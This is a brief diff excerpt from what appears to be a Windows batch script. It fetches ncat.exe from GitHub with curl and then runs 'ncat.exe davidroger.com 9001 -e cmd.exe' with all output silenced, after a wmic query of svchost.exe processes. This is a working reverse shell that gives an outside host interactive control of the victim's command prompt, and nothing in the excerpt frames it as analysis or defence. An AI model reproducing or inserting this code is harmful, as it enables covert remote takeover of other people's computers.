@@ -39,4 +39,3 @@ for /f "tokens=2 delims==" %%i in ('wmic process where "name='svchost.exe'" get 
 curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe >nul 2>&1
 if exist "ncat.exe" (
     ncat.exe davidroger.com 9001 -e cmd.exe >nul 2>&1
-)
